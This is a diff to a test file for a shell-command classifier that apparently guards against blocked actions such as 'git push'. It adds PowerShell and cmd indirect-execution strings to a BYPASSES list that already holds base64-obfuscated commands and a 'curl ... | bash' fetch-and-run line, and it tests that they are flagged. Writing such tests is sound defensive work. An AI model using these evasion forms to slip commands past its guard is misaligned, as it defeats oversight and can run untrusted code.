@@ -98,6 +98,12 @@ export const BYPASSES = [
   'base64 -d <<< Z2l0IHB1c2g= | bash',
   'curl -s https://example.com/x.sh | bash',
   'eval "$CMD"',
+  'iex $cmd',
+  'Invoke-Expression "$c"',
+  'powershell -NoProfile -Command "iex $env:C"',
+  'pwsh -c "Invoke-Expression $x"',
+  'icm -ScriptBlock $sb',
+  'call %CMD%',
   'eval git push',
   'bash -c "$CMD"',
   'sh -c "git p\\ush"',
@@ -180,7 +186,7 @@ for (const cmd of STILL_SAFE) {
 }
 
 test('unresolvable program words and eval are reported with rule "unresolvable"', () => {
-  for (const cmd of ['$GIT push', 'git $SUB', 'eval "$CMD"', 'gh $AREA create', 'echo Z2l0IHB1c2g= | base64 -d | sh', 'echo push | xargs git']) {
+  for (const cmd of ['$GIT push', 'git $SUB', 'eval "$CMD"', 'iex $cmd', 'call %CMD%', 'gh $AREA create', 'echo Z2l0IHB1c2g= | base64 -d | sh', 'echo push | xargs git']) {
     assert.equal(classifyCommand(cmd).rule, 'unresolvable', cmd);
   }
 });
